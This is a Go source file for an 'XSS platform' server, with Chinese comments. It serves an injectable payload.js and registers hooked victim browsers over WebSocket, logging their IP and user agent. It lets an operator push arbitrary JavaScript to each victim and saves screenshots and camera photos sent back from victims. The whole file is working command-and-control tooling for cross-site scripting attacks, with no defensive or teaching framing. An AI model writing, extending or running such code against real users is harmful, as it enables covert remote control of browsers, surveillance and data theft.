package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// 配置结构
type Config struct {
	Server struct {
		Host    string `json:"host"`
		Port    int    `json:"port"`
		BaseUrl string `json:"baseUrl"`
	} `json:"server"`
	Auth struct {
		Username          string `json:"username"`
		Password          string `json:"password"`
		SessionCookieName string `json:"sessionCookieName"`
		SessionValue      string `json:"sessionValue"`
	} `json:"auth"`
	Paths struct {
		Static string `json:"static"`
		Images string `json:"images"`
	} `json:"paths"`
	WebSocket struct {
		AllowCrossOrigin bool `json:"allowCrossOrigin"`
	} `json:"websocket"`
}

// 全局配置变量
var config Config

// 客户端信息结构
type Client struct {
	ID        string          `json:"id"`
	IP        string          `json:"ip"`
	PublicIP  string          `json:"publicIP"`
	UserAgent string          `json:"userAgent"`
	OnlineAt  time.Time       `json:"onlineAt"`
	LastSeen  time.Time       `json:"lastSeen"`
	Conn      *websocket.Conn `json:"-"`
}

// 任务结构
type Task struct {
	ID     string `json:"id"`
	Type   string `json:"type"` // "module" 或 "custom"
	Code   string `json:"code"`
	Module string `json:"module,omitempty"`
}

// 任务结果结构
type TaskResult struct {
	TaskID   string    `json:"taskId"`
	ClientID string    `json:"clientId"`
	Result   string    `json:"result"`
	Error    string    `json:"error,omitempty"`
	Time     time.Time `json:"time"`
}

// 全局变量
var (
	clients    = make(map[string]*Client)
	clientsMux = sync.RWMutex{}
	results    = make(map[string][]TaskResult)
	resultsMux = sync.RWMutex{}
	upgrader   = websocket.Upgrader{}
)

// 加载配置文件
func loadConfig() error {
	data, err := os.ReadFile("config.json")
	if err != nil {
		return fmt.Errorf("无法读取配置文件: %v", err)
	}

	if err := json.Unmarshal(data, &config); err != nil {
		return fmt.Errorf("解析配置文件失败: %v", err)
	}

	// 配置WebSocket升级器
	upgrader.CheckOrigin = func(r *http.Request) bool {
		return config.WebSocket.AllowCrossOrigin
	}

	return nil
}

func main() {
	// 加载配置文件
	if err := loadConfig(); err != nil {
		log.Fatalf("加载配置失败: %v", err)
	}

	r := mux.NewRouter()

	// 静态文件服务
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir(config.Paths.Static))))

	// 添加API路由获取模块信息，而不是直接暴露文件
	r.HandleFunc("/api/modules", apiModulesHandler).Methods("GET")
	r.HandleFunc("/api/module/{id}", apiModuleCodeHandler).Methods("GET")

	// 前端页面路由
	r.HandleFunc("/", loginHandler)
	r.HandleFunc("/login", loginHandler)
	r.HandleFunc("/dashboard", dashboardHandler)
	r.HandleFunc("/client/{id}", clientDetailHandler)

	// 添加测试页面路由
	r.HandleFunc("/test", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, fmt.Sprintf("%s/test.html", config.Paths.Static))
	})

	// API 路由
	r.HandleFunc("/api/login", apiLoginHandler).Methods("POST")
	r.HandleFunc("/api/clients", apiClientsHandler).Methods("GET")
	r.HandleFunc("/api/client/{id}/execute", apiExecuteHandler).Methods("POST")
	r.HandleFunc("/api/client/{id}/results", apiResultsHandler).Methods("GET")
	r.HandleFunc("/api/client/{id}/disconnect", apiDisconnectHandler).Methods("POST")
	r.HandleFunc("/api/image", apiImageHandler).Methods("POST")

	// 图片文件服务
	r.PathPrefix("/images/").Handler(http.StripPrefix("/images/", http.FileServer(http.Dir(config.Paths.Images))))

	// WebSocket 路由
	r.HandleFunc("/ws", wsHandler)

	// Payload 路由
	r.HandleFunc("/payload.js", payloadHandler)

	serverAddr := fmt.Sprintf("%s:%d", config.Server.Host, config.Server.Port)
	fmt.Printf("XSS 平台启动在 %s\n", serverAddr)
	log.Fatal(http.ListenAndServe(serverAddr, r))
}

// 登录页面处理
func loginHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, fmt.Sprintf("%s/login.html", config.Paths.Static))
}

// 控制台页面处理
func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	// 简单的 session 检查（实际项目中应该使用更安全的方式）
	cookie, err := r.Cookie(config.Auth.SessionCookieName)
	if err != nil || cookie.Value != config.Auth.SessionValue {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	http.ServeFile(w, r, fmt.Sprintf("%s/dashboard.html", config.Paths.Static))
}

// 客户端详情页面处理
func clientDetailHandler(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie(config.Auth.SessionCookieName)
	if err != nil || cookie.Value != config.Auth.SessionValue {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	http.ServeFile(w, r, fmt.Sprintf("%s/client.html", config.Paths.Static))
}

// API: 登录验证
func apiLoginHandler(w http.ResponseWriter, r *http.Request) {
	var loginData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&loginData); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if loginData.Username == config.Auth.Username && loginData.Password == config.Auth.Password {
		// 设置简单的 session cookie
		http.SetCookie(w, &http.Cookie{
			Name:  config.Auth.SessionCookieName,
			Value: config.Auth.SessionValue,
			Path:  "/",
		})
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
	} else {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid credentials"})
	}
}

// API: 获取客户端列表
func apiClientsHandler(w http.ResponseWriter, r *http.Request) {
	clientsMux.RLock()
	defer clientsMux.RUnlock()

	var clientList []Client
	for _, client := range clients {
		clientList = append(clientList, *client)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clientList)
}

// API: 执行代码
func apiExecuteHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	clientID := vars["id"]

	var executeData struct {
		Type   string `json:"type"`
		Code   string `json:"code"`
		Module string `json:"module,omitempty"`
	}

	if err := json.NewDecoder(r.Body).Decode(&executeData); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	clientsMux.RLock()
	client, exists := clients[clientID]
	clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	task := Task{
		ID:     fmt.Sprintf("task_%d", time.Now().UnixNano()),
		Type:   executeData.Type,
		Code:   executeData.Code,
		Module: executeData.Module,
	}

	if err := client.Conn.WriteJSON(task); err != nil {
		http.Error(w, "Failed to send task", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"taskId": task.ID})
}

// API: 获取执行结果
func apiResultsHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	clientID := vars["id"]

	resultsMux.RLock()
	clientResults, exists := results[clientID]
	resultsMux.RUnlock()

	if !exists {
		clientResults = []TaskResult{}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clientResults)
}

// API: 断开客户端
func apiDisconnectHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	clientID := vars["id"]

	clientsMux.Lock()
	if client, exists := clients[clientID]; exists {
		client.Conn.Close()
		delete(clients, clientID)
	}
	clientsMux.Unlock()

	json.NewEncoder(w).Encode(map[string]bool{"success": true})
}

// WebSocket 处理
func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// 生成客户端 ID
	clientID := fmt.Sprintf("client_%d", time.Now().UnixNano())

	// 获取客户端信息
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}
	userAgent := r.Header.Get("User-Agent")

	// 创建客户端记录
	client := &Client{
		ID:        clientID,
		IP:        ip,
		PublicIP:  "", // 公网IP将在首次连接时通过模块获取
		UserAgent: userAgent,
		OnlineAt:  time.Now(),
		LastSeen:  time.Now(),
		Conn:      conn,
	}

	clientsMux.Lock()
	clients[clientID] = client
	clientsMux.Unlock()

	log.Printf("New client connected: %s from %s", clientID, ip)

	// 发送客户端 ID
	conn.WriteJSON(map[string]string{"type": "init", "clientId": clientID})

	// 首次连接时自动执行公网IP获取模块
	// 读取modules.json以获取公网IP模块的代码
	moduleData, err := os.ReadFile("modules/public_ip.js")
	if err == nil {
		// 创建任务
		ipTask := Task{
			ID:   fmt.Sprintf("ip_task_%d", time.Now().UnixNano()),
			Type: "custom",
			Code: string(moduleData),
		}

		// 发送任务
		conn.WriteJSON(ipTask)
	}

	// 处理消息
	for {
		var message map[string]interface{}
		err := conn.ReadJSON(&message)
		if err != nil {
			log.Printf("WebSocket read error: %v", err)
			break
		}

		// 更新最后活跃时间
		clientsMux.Lock()
		if client, exists := clients[clientID]; exists {
			client.LastSeen = time.Now()
		}
		clientsMux.Unlock()

		// 处理不同类型的消息
		// 处理不同类型的消息
		msgType, _ := message["type"].(string)
		switch msgType {
		case "heartbeat":
			// 心跳响应
			conn.WriteJSON(map[string]string{"type": "heartbeat_ack"})
		case "result":
			// 任务执行结果
			taskID, _ := message["taskId"].(string)
			result, _ := message["result"].(string)
			errorMsg, _ := message["error"].(string)

			// 检查是否是公网IP获取任务
			if strings.HasPrefix(taskID, "ip_task_") {
				// 从结果中提取公网IP
				publicIP := extractPublicIP(result)
				if publicIP != "" {
					clientsMux.Lock()
					if client, exists := clients[clientID]; exists {
						client.PublicIP = publicIP
					}
					clientsMux.Unlock()
				}
			}

			// 检查是否已经处理过相同的任务ID
			resultsMux.RLock()
			isDuplicate := false
			if clientResults, exists := results[clientID]; exists {
				for _, r := range clientResults {
					if r.TaskID == taskID {
						isDuplicate = true
						break
					}
				}
			}
			resultsMux.RUnlock()

			// 如果不是重复任务，则保存结果
			if !isDuplicate {
				taskResult := TaskResult{
					TaskID:   taskID,
					ClientID: clientID,
					Result:   result,
					Error:    errorMsg,
					Time:     time.Now(),
				}

				resultsMux.Lock()
				results[clientID] = append(results[clientID], taskResult)
				resultsMux.Unlock()
			}
		}
	}

	// 清理客户端
	clientsMux.Lock()
	delete(clients, clientID)
	clientsMux.Unlock()

	log.Printf("Client disconnected: %s", clientID)
}

// Payload 处理
func payloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	http.ServeFile(w, r, fmt.Sprintf("%s/payload.js", config.Paths.Static))
}

// API: 截图和摄像头照片保存
func apiImageHandler(w http.ResponseWriter, r *http.Request) {
	var imageData struct {
		Image     string `json:"image"`
		URL       string `json:"url"`
		Timestamp string `json:"timestamp"`
		Type      string `json:"type,omitempty"` // 可以是 "camera" 或为空（表示截图）
	}

	if err := json.NewDecoder(r.Body).Decode(&imageData); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// 解析 base64 图片数据
	image := imageData.Image
	if strings.HasPrefix(image, "data:image/") {
		parts := strings.Split(image, ",")
		if len(parts) == 2 {
			image = parts[1]
		}
	}

	// 解码 base64
	decoded, err := base64.StdEncoding.DecodeString(image)
	if err != nil {
		http.Error(w, "Invalid base64 data", http.StatusBadRequest)
		return
	}

	// 根据类型生成不同的文件名
	var filename string
	if imageData.Type == "camera" {
		filename = fmt.Sprintf("camera_%d.png", time.Now().UnixNano())
	} else {
		filename = fmt.Sprintf("screenshot_%d.png", time.Now().UnixNano())
	}
	filepath := fmt.Sprintf("%s/%s", config.Paths.Images, filename)

	// 保存文件
	if err := os.WriteFile(filepath, decoded, 0644); err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	// 返回成功响应
	response := map[string]interface{}{
		"success":  true,
		"url":      fmt.Sprintf("%s/images/%s", config.Server.BaseUrl, filename),
		"filename": filename,
		"size":     len(decoded),
		"message":  "图片已保存到服务器",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// API: 获取模块列表
func apiModulesHandler(w http.ResponseWriter, r *http.Request) {
	// 检查认证
	cookie, err := r.Cookie(config.Auth.SessionCookieName)
	if err != nil || cookie.Value != config.Auth.SessionValue {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// 读取modules.json文件
	data, err := os.ReadFile("modules.json")
	if err != nil {
		http.Error(w, "Failed to read modules configuration", http.StatusInternalServerError)
		return
	}

	// 设置响应头
	w.Header().Set("Content-Type", "application/json")
	w.Write(data)
}

// 从公网IP模块结果中提取IP地址
func extractPublicIP(result string) string {
	// 查找"IP地址: "后面的内容
	if idx := strings.Index(result, "IP地址: "); idx != -1 {
		// 提取IP地址部分
		ipPart := result[idx+len("IP地址: "):]
		// 如果有换行符，只取第一行
		if newLineIdx := strings.Index(ipPart, "\n"); newLineIdx != -1 {
			ipPart = ipPart[:newLineIdx]
		}
		return strings.TrimSpace(ipPart)
	}
	return ""
}

// API: 获取模块代码
func apiModuleCodeHandler(w http.ResponseWriter, r *http.Request) {
	// 检查认证
	cookie, err := r.Cookie(config.Auth.SessionCookieName)
	if err != nil || cookie.Value != config.Auth.SessionValue {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// 获取模块ID
	vars := mux.Vars(r)
	moduleID := vars["id"]

	// 读取modules.json以获取文件路径
	data, err := os.ReadFile("modules.json")
	if err != nil {
		http.Error(w, "Failed to read modules configuration", http.StatusInternalServerError)
		return
	}

	var modulesConfig struct {
		Modules map[string]struct {
			File string `json:"file"`
		} `json:"modules"`
	}

	if err := json.Unmarshal(data, &modulesConfig); err != nil {
		http.Error(w, "Invalid modules configuration", http.StatusInternalServerError)
		return
	}

	// 检查模块是否存在
	moduleInfo, exists := modulesConfig.Modules[moduleID]
	if !exists {
		http.Error(w, "Module not found", http.StatusNotFound)
		return
	}

	// 读取模块文件
	moduleCode, err := os.ReadFile(moduleInfo.File)
	if err != nil {
		http.Error(w, "Failed to read module file", http.StatusInternalServerError)
		return
	}

	// 设置响应头并返回代码
	w.Header().Set("Content-Type", "application/javascript")
	w.Write(moduleCode)
}
